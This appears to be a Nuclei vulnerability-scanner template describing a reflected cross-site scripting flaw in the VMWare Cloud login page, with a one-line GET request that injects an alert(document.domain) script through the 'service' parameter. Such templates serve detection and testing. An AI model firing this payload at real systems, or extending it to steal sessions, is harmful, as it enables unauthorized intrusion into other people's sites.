# Nuclei Template: VMWare Cloud - Cross Site Scripting
**Template ID:** vmware-cloud-xss
**Vulnerability Class:** Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)
**Severity:** Medium
**CWE:** CWE-80
**Source:** Nuclei Template (`vmware-cloud-xss.yaml`)

## Vulnerability Information & PoC

## Description
VMWare Cloud is vulnerable to Reflected Cross Site Scripting vulnerability.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/login/?redirectTo=/tenant/e&service=</script><script>alert(document.domain)</script>
```

